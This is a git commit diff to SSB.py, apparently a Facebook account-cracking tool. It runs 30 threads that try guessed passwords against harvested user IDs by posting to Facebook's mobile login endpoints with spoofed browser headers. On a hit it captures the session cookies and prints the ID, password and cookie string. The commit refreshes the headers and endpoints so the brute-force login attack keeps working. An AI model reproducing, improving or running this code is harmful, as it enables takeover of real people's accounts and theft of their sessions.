5fda6e9b48e0ce7f98411af86d23e8d1a22d6ce2
AyeshaPari <119471955+AyeshaPari@users.noreply.github.com>
2023-01-07 14:01:45 +0500

    Update SSB.py

--- SSB.py
+++ SSB.py
@@ -183,26 +183,21 @@ class __xxx__:
                 pw = pw.lower()
                 session=requests.Session()
                 header = {
-                    'authority': 'mobile.facebook.com',
-                    'method': 'GET',
-                    'path': '/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
-                    'scheme': 'https',
-                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-                    'accept-encoding': 'gzip, deflate, br',
-                    'accept-language': 'en-US,en;q=0.9',
-                    
-                    'referer': 'https://mobile.facebook.com/?zero_e=3&zero_et=1673076621&_rdc=1&_rdr&refsrc=deprecated',
-                    'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
-                    'sec-ch-ua-mobile': '?0',
-                    'sec-ch-ua-platform': '"Windows"',
-                    'sec-fetch-dest': 'document',
-                    'sec-fetch-mode': 'navigate',
-                    'sec-fetch-site': 'same-origin',
-                    'sec-fetch-user': '?1',
-                    'upgrade-insecure-requests': '1',
-                    'user-agent': ua
+                    "Host":cebok,
+                    "upgrade-insecure-requests":"1",
+                    "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
+                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+                    "dnt":"1",
+                    "x-requested-with":"mark.via.gp",
+                    "sec-fetch-site":"same-origin",
+                    "sec-fetch-mode":"cors",
+                    "sec-fetch-user":"empty",
+                    "sec-fetch-dest":"document",
+                    "referer":"https://m.facebook.com/",
+                    "accept-encoding":"gzip, deflate br",
+                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                 }
-                r = session.get(f'https://mobile.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8', headers=header)
+                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                 das = {
                     "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                     "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
@@ -212,27 +207,23 @@ class __xxx__:
                     "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                 }
                 header1 = {
-                    'authority': 'mobile.facebook.com',
-                    'method': 'POST',
-                    'path': '/a/bz?fb_dtsg=NAcNxMfKqYCvBF3D3Xpe4lhhCW0rH2JdogOxD7jWl7nl5GQ5y017CVw%3A0%3A0&jazoest=24793&lsd=AVqFb0wF-Es&__dyn=0wzpawlEaU4ifDg9ppk2m3q12wAxu13w9y1DxW0Oohw5ux60Vo1a852q1ew65wce09MKdw73wwyo1Do1u86i0h-0zE1bE881eEdEG0hi0Lo6-0Co2cw8-&__csr=&__req=1&__a=AYnD5WrghhSdAHkU6_CE3kflL93bA-oPevUccN-1BjMbqAywr6Rb-QMS4TBT0EBZe0i_eNmgLj2AjvPpD1-90tlErJylcp4XEAYbYRkCxQoTng&__user=0',
-                    'scheme': 'https',
-                    'accept': '*/*',
-                    'accept-encoding': 'gzip, deflate, br',
-                    'accept-language': 'en-US,en;q=0.9',
-                    'content-length': '1841',
-                    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryxIxc3c1wf1XPq5yL',
-
-                    'origin': 'https://mobile.facebook.com',
-                    'referer': 'https://mobile.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
-                    'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome",v="108"',
-                    'sec-ch-ua-mobile': '?0',
-                    'sec-ch-ua-platform': '"Windows"',
-                    'sec-fetch-dest': 'empty',
-                    'sec-fetch-mode': 'cors',
-                    'sec-fetch-site': 'same-origin',
-                    'user-agent': ua
+                    "Host":cebok,
+                    "cache-control":"max-age=0",
+                    "upgrade-insecure-requests":"1",
+                    "origin":"https://"+cebok,
+                    "content-type":"application/x-www-form-urlencoded",
+                    "user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
+                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+                    "x-requested-with":"XMLHttpRequest",
+                    "sec-fetch-site":"same-origin",
+                    "sec-fetch-mode":"cors",
+                    "sec-fetch-user":"empty",
+                    "sec-fetch-dest":"document",
+                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
+                    "accept-encoding":"gzip, deflate br",
+                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                 }
-                po = session.post('https://mobile.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8', data = das, headers = header1, allow_redirects = False)
+                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                 if 'c_user' in session.cookies.get_dict():
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     print(f"\r{H} [ð™Žð™ð˜¾ð˜¾ð™€ð™Žð™Ž ð™Žð˜¼ð™…ð™…ð˜¼ð˜¿ -OK] {user} | {pw}")
@@ -285,10 +276,10 @@ class __xxx__:
             os.system("clear")
             print(logo)
             print("\033[1;31m\r                THIS TOOL ONLY DATA USER\033[1;37m")
-            
+            print("\033[1;32mâ€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢")
             print('\033[1;33m Total Auto file IDs : %s ' % len(self.id))
             print('\033[1;34m Cracking Started...')
-            
+            print("\033[1;32mâ€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢")
             with sarfrazssb(max_workers=30) as ssbworld:
                 for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
@@ -503,7 +494,7 @@ def auto():
                 print('  Grabbed from: '+ids)
                 print('  Friendlist ids: 0')
                 print('  Token status: Live')
-                
+                print("\033[1;32mâ€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢")
                 os.system('rm -rf temp*')
                 pass
     lenid = open('/sdcard/'+save_file, 'r').readlines()
@@ -511,7 +502,7 @@ def auto():
     os.system('rm -rf temp*')
     print('  Total ids grabbed: '+str(len(lenid)))
     print('  File saved as: /sdcard/'+save_file)
-    
+    print("\033[1;32mâ€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢")
     input('  Press enter to back ')
     safraz()
     
